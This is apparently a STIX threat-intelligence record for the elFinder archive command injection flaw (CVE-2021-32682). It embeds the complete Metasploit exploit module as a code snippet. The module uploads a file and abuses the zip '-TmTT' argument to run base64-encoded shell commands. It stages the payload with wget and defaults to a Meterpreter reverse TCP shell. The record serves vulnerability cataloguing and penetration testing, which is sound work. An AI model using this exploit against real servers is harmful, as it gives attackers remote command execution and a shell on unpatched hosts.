{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--48c1ac7d-9953-4b4d-bd05-b6c819de2de6",
    "created": "2024-08-14T17:01:15.220139Z",
    "modified": "2024-08-14T17:01:15.220152Z",
    "name": "elFinder Archive Command Injection",
    "description": " elFinder versions below 2.1.59 are vulnerable to a command injection vulnerability via its archive functionality.  When creating a new zip archive, the `name` parameter is sanitized with the `escapeshellarg()` php function and then passed to the `zip` utility. Despite the sanitization, supplying the `-TmTT` argument as part of the `name` parameter is still permitted and enables the execution of arbitrary commands as the `www-data` user.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/elfinder_archive_cmd_injection.rb",
            "external_id": "elfinder_archive_cmd_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-32682"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'elFinder Archive Command Injection',\n        'Description' => %q{\n          elFinder versions below 2.1.59 are vulnerable to a command injection\n          vulnerability via its archive functionality.\n\n          When creating a new zip archive, the `name` parameter is sanitized\n          with the `escapeshellarg()` php function and then passed to the\n          `zip` utility. Despite the sanitization, supplying the `-TmTT`\n          argument as part of the `name` parameter is still permitted and\n          enables the execution of arbitrary commands as the `www-data` user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Thomas Chauchefoin', # Discovery\n          'Shelby Pace' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2021-32682' ],\n          [ 'URL', 'https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities' ]\n        ],\n        'Platform' => [ 'linux' ],\n        'Privileged' => false,\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Targets' => [\n          [\n            'Automatic Target',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ ARCH_X86, ARCH_X64 ],\n              'CmdStagerFlavor' => [ 'wget' ],\n              'DefaultOptions' => { 'Payload' => 'linux/x86/meterpreter/reverse_tcp' }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2021-06-13',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n\n    register_options([ OptString.new('TARGETURI', [ true, 'The URI of elFinder', '/' ]) ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => upload_uri\n    )\n\n    return CheckCode::Unknown('Failed to retrieve a response') unless res\n    return CheckCode::Safe('Failed to detect elFinder') unless res.body.include?('[\"errUnknownCmd\"]')\n\n    vprint_status('Attempting to check the changelog for elFinder version')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'Changelog')\n    )\n\n    unless res\n      return CheckCode::Detected('elFinder is running, but cannot detect version through the changelog')\n    end\n\n    # * elFinder (2.1.58)\n    vers_str = res.body.match(/\\*\\s+elFinder\\s+\\((\\d+\\.\\d+\\.\\d+)\\)/)\n    if vers_str.nil? || vers_str.length <= 1\n      return CheckCode::Detected('elFinder is running, but couldn\\'t retrieve the version')\n    end\n\n    version_found = Rex::Version.new(vers_str[1])\n    if version_found < Rex::Version.new('2.1.59')\n      return CheckCode::Appears(\"elFinder running version #{vers_str[1]}\")\n    end\n\n    CheckCode::Safe(\"Detected elFinder version #{vers_str[1]}, which is not vulnerable\")\n  end\n\n  def upload_uri\n    normalize_uri(target_uri.path, 'php', 'connector.minimal.php')\n  end\n\n  def upload_successful?(response)\n    unless response\n      print_bad('Did not receive a response from elFinder')\n      return false\n    end\n\n    if response.code != 200 || response.body.include?('error')\n      print_bad(\"Request failed: #{response.body}\")\n      return false\n    end\n\n    unless response.body.include?('added')\n      print_bad(\"Failed to add new file: #{response.body}\")\n      return false\n    end\n    json = JSON.parse(response.body)\n    if json['added'].empty?\n      return false\n    end\n\n    true\n  end\n\n  alias archive_successful? upload_successful?\n\n  def upload_txt_file(file_name)\n    file_data = Rex::Text.rand_text_alpha(8..20)\n\n    data = Rex::MIME::Message.new\n    data.add_part('upload', nil, nil, 'form-data; name=\"cmd\"')\n    data.add_part('l1_Lw', nil, nil, 'form-data; name=\"target\"')\n    data.add_part(file_data, 'text/plain', nil, \"form-data; name=\\\"upload[]\\\"; filename=\\\"#{file_name}\\\"\")\n\n    print_status(\"Uploading file #{file_name} to elFinder\")\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => upload_uri,\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data.to_s\n    )\n  end\n\n  def create_archive(archive_name, *files_to_archive)\n    files_to_archive = files_to_archive.map { |file_name| \"l1_#{Rex::Text.encode_base64(file_name)}\" }\n\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => upload_uri,\n      'encode_params' => false,\n      'vars_get' =>\n      {\n        'cmd' => 'archive',\n        'name' => archive_name,\n        'target' => 'l1_Lw',\n        'type' => 'application/zip',\n        'targets[]' => files_to_archive.join('&targets[]=')\n      }\n    )\n  end\n\n  def setup_files_for_sploit\n    @txt_file = \"#{Rex::Text.rand_text_alpha(5..10)}.txt\"\n    res = upload_txt_file(@txt_file)\n    fail_with(Failure::UnexpectedReply, 'Upload was not successful') unless upload_successful?(res)\n    print_good('Text file was successfully uploaded!')\n\n    @archive_name = \"#{Rex::Text.rand_text_alpha(5..10)}.zip\"\n    print_status(\"Attempting to create archive #{@archive_name}\")\n    res = create_archive(@archive_name, @txt_file)\n    fail_with(Failure::UnexpectedReply, 'Archive was not created') unless archive_successful?(res)\n    print_good('Archive was successfully created!')\n\n    register_files_for_cleanup(@txt_file, @archive_name)\n  end\n\n  # zip -r9 -q '-TmTT=\"$(id>out.txt)foooo\".zip' './a.zip' './a.txt' - sonarsource blog post\n  def execute_command(cmd, _opts = {})\n    cmd = \"echo #{Rex::Text.encode_base64(cmd)} | base64 -d |sh\"\n    cmd_arg = \"-TmTT=\\\"$(#{cmd})#{Rex::Text.rand_text_alpha(1..3)}\\\"\"\n    cmd_arg = cmd_arg.gsub(' ', '${IFS}')\n\n    create_archive(cmd_arg, @archive_name, @txt_file)\n  end\n\n  def exploit\n    setup_files_for_sploit\n    execute_cmdstager(noconcat: true, linemax: 150)\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-06-13",
    "x_mitre_platforms": [
        "linux'"
    ]
}